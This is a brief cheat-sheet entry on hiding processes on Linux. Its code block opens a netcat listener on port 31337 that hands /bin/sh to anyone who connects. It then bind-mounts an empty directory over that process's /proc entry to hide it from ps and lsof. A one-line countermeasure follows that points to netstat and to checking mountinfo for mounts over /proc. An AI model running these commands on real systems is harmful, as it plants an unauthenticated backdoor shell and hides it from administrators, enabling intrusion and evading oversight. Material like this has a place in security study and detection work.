# Hiding Processes

### Listening sockets, hiding from ps and lsof <a href="hideprocesses" id="hideprocesses"></a>

```
mkdir /tmp/empty
/bin/nc.traditional -l -p 31337 -e /bin/sh &
ps aux | grep $!
sudo mount --bind /tmp/empty /proc/$!
ps aux | grep $!
```

#### Countermeasure:&#x20;

`netstat -tulpe` and checking `cat /proc/$$/mountinfo` for suspicious mounts over `/proc`
